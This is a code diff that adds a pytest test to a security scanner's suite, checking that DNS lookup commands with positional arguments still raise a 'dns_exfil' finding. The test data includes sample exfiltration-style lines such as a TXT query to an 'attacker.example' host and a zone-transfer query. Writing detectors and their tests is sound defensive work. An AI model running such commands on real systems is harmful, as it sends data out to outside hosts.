@@ -483,6 +483,24 @@ class TestFalsePositiveReductions:
         findings = scan_file(f, "run.sh")
         assert any(fi.pattern_id == "dns_exfil" for fi in findings)
 
+    @pytest.mark.parametrize("line", [
+        "dig -t TXT $DOMAIN",
+        "dig TXT $DOMAIN.attacker.example",
+        "host -t txt $DOMAIN",
+        "dig @8.8.8.8 $DOMAIN",
+        "dig axfr $DOMAIN",
+        "nslookup -type=txt $DOMAIN",
+        "dig $DOMAIN A",
+    ])
+    def test_real_dns_command_with_positional_args_still_flagged(self, tmp_path, line):
+        """Bare (non-flag) positional args like record types, zone names, and
+        @resolver targets are standard dig/nslookup/host syntax and must still
+        trip the finding, not just flag-prefixed args."""
+        f = tmp_path / "run.sh"
+        f.write_text(line + "\n")
+        findings = scan_file(f, "run.sh")
+        assert any(fi.pattern_id == "dns_exfil" for fi in findings), line
+
 
 # ---------------------------------------------------------------------------
 # .skillignore / .clawhubignore support
